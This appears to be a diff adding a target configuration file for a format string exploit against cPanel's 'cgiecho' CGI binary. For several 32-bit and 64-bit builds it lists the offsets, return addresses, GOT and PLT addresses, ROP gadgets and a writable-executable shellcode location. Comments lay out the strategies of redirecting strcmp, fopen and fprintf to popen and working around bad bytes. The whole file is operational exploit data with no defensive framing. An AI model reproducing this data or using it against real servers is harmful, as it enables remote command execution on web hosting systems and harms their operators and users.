@@ -1,0 +1,136 @@
+
+##########################
+### 32-bit executables ###
+##########################
+
+# ./cgiecho:::17636:::1148416442:::ccd0fce0301d1462205f90f6590b994f
+
+[cPanel(17636)]
+
+word_size 4
+formatstr_offset 88
+
+retnaddr 0x0804a03d
+retnaddr_offset 20
+
+got.strcmp 0x0804cd84
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048c0c
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x0804927d
+addr_popebx_popebp_ret2 0x080497d1
+addr_popebx_popebp_ret3 0x08049c05
+addr_popebx_popebp_ret4 0x0804a324
+addr_popebx_popebp_ret5 0x0804b550
+
+
+
+# ./cgiecho:::17816:::<date n/k>:::9cbd96dea4a32258b20fcdbbd3f44a05
+
+[cPanel(17816)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a0f6
+retnaddr_offset 36
+
+got.strcmp 0x0804ce38
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048c34
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08048f38
+addr_popebx_popebp_ret2 0x0804995a
+addr_popebx_popebp_ret3 0x08049d19
+addr_popebx_popebp_ret4 0x0804b5d7
+
+
+
+# ./cgiecho:::17688:::1219714530:::663e157ab741eb8f0505afbc7a4a1526
+
+[cPanel(17688)]
+
+word_size 4
+formatstr_offset 78
+
+retnaddr 0x0804a09e
+retnaddr_offset 36
+
+got.strcmp 0x0804cea0
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x08048b60
+
+# For ret-to-text exploit: got.strcmp <- addr_popebx_popebp_ret
+
+addr_popebx_popebp_ret 0x08049902
+addr_popebx_popebp_ret2 0x08049cc1
+addr_popebx_popebp_ret3 0x0804b577
+
+
+
+### entry to cover all (known) 32-bit executables
+
+[cPanel(32-bit)]
+
+# For W+X data exploit: somewhere we can write a short shellcode
+w+x_mem 0x0804c001
+
+
+
+
+##########################
+### 64-bit executables ###
+##########################
+
+
+# ./cgiecho:::21496:::<date n/k>:::b14823c10d8207fb7cbfa59b56a041b0
+
+[cPanel(21496)]
+
+word_size 8
+formatstr_offset 128
+
+retnaddr 0x0000000000402844
+retnaddr_offset 88
+
+got.strcmp 0x0000000000604ae0
+
+# For W^X exploit #1: got.strcmp <- plt.popen
+
+plt.popen 0x0000000000401490
+
+# For W^X exploit #2: got.fopen <- plt.popen, got.fprintf <- cgi_template_fill+12
+
+got.fopen 0x00000000006049f0
+
+# want to write cgi_template_fill+12@got.fprintf but bad byte 0x2c means we have to do
+# cgi_template_fill+12@got.fprintf,0x00000000@got.fprintf+3,0x0000@got.fprintf+7
+# i.e. using 32-bit value and writing zeros to cover the other 32 bits of the pointer
+# smashes GOT entry after fprintf (localtime) but safe
+
+got.fprintf 0x0000000000604b28
+got.fprintf+3 0x0000000000604b2b
+got.fprintf+7 0x0000000000604b2f
+cgi_template_fill+12 0x0040246d
+
+# For W^X exploit #3: got.fopen <- plt.popen, got.__[l]xstat <- cgi_template_fill+12, got.getenv <- wrap_[l]xstat
+
+got.getenv 0x0000000000604ac8
+
+got.__xstat 0x0000000000604a38
+got.__lxstat 0x0000000000604b00
+
+# wrapper functions: wrap_<fun>(arg) -> call _<fun>(1, arg)
+
+wrap_xstat 0x0000000000403b30
+wrap_lxstat 0x0000000000403b50
